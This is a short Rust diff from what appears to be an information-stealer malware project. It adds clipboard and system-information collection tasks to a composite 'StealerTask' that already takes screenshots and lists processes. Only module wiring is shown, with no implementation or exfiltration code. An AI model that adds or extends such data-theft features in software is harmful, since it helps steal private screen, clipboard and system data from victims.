@@ -1,8 +1,12 @@
 mod screenshot;
 mod processes;
+mod systeminfo;
+mod clipboard;
 
+use crate::stealer::clipboard::ClipboardTask;
 use crate::stealer::processes::ProcessesTask;
 use crate::stealer::screenshot::ScreenshotTask;
+use crate::stealer::systeminfo::SystemInfoTask;
 use alloc::sync::Arc;
 use alloc::vec;
 use tasks::{CompositeTask, Task};
@@ -19,6 +23,8 @@ impl StealerTask {
                 vec![
                     Arc::new(ScreenshotTask),
                     Arc::new(ProcessesTask),
+                    Arc::new(SystemInfoTask),
+                    Arc::new(ClipboardTask),
                 ]
             )
         }
